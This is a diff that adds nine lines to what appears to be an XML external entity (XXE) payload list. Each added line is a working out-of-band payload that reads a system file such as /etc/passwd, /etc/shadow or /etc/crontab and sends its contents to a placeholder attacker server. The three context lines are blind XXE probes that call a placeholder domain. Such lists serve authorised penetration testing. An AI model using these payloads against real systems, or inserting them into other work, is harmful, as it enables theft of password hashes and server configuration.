@@ -1,3 +1,12 @@
+<!DOCTYPE data [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % start "<!ENTITY &#37; trick SYSTEM 'http://your-server.com/?%xxe;'>">%start;]>
+<!DOCTYPE data [<!ENTITY % xxe SYSTEM "file:///etc/hosts"><!ENTITY % start "<!ENTITY &#37; trick SYSTEM 'http://your-server.com/?%xxe;'>">%start;]>
+<!DOCTYPE data [ <!ENTITY % xxe SYSTEM "file:///etc/group"><!ENTITY % start "<!ENTITY &#37; trick SYSTEM 'http://your-server.com/?%xxe;'>">%start;]>
+<!DOCTYPE data [ <!ENTITY % xxe SYSTEM "file:///etc/resolv.conf"> <!ENTITY % start "<!ENTITY &#37; trick SYSTEM 'http://your-server.com/?%xxe;'>"> %start;]>
+<!DOCTYPE data [<!ENTITY % xxe SYSTEM "file:///etc/shadow"><!ENTITY % start "<!ENTITY &#37; trick SYSTEM 'http://your-server.com/?%xxe;'>"> %start;]>
+<!DOCTYPE data [<!ENTITY % xxe SYSTEM "file:///etc/apache2/apache2.conf"><!ENTITY % start "<!ENTITY &#37; trick SYSTEM 'http://your-server.com/?%xxe;'>">%start;]>
+<!DOCTYPE data [ <!ENTITY % xxe SYSTEM "file:///etc/crontab"> <!ENTITY % start "<!ENTITY &#37; trick SYSTEM 'http://your-server.com/?%xxe;'>">%start;]>
+<!DOCTYPE data [<!ENTITY % xxe SYSTEM "file:///etc/hostname"><!ENTITY % start "<!ENTITY &#37; trick SYSTEM 'http://your-server.com/?%xxe;'>"> %start;]>
+<!DOCTYPE data [<!ENTITY % xxe SYSTEM "file:///etc/issue"> <!ENTITY % start "<!ENTITY &#37; trick SYSTEM 'http://yourserver.com/%xxe;'>"> %start;]>
 <?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE x SYSTEM "http://xxe-doctype-system.yourdomain[.]com/"><x />
 <?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE x PUBLIC "" "http://xxe-doctype-public.yourdomain[.]com/"><x />
 <?xml version="1.0" encoding="utf-8" standalone="no" ?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://xxe-entity-system.yourdomain[.]com/">]><x>&xxe;</x>
